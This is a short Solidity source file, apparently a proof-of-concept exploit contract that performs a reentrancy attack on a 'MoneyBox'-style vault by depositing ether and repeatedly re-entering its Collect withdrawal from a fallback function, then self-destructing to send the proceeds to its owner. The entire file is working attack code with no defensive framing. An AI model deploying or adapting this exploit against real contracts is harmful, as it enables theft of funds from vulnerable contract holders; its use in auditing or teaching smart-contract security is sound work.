pragma solidity ^0.4.19;

interface IMoneyBox {
    function Put(uint _lockTime) external payable;
    function Collect(uint _am) external;
}

contract ReentrancyExploit {
    IMoneyBox public target;
    address public owner;
    uint public reentryCount = 0;
    uint public maxReentry = 3;

    constructor(address _target) public {
        target = IMoneyBox(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // Deposit funds
        target.Put.value(msg.value)(0);

        // Trigger withdrawal (reentrancy starts here)
        target.Collect(msg.value);
    }

    // Fallback to receive reentrant call
    function () public payable {
        if (reentryCount < maxReentry) {
            reentryCount++;
            target.Collect(msg.value); // Recursive call
        }
    }

    function drain() public {
        require(msg.sender == owner);
        selfdestruct(owner);
    }
}

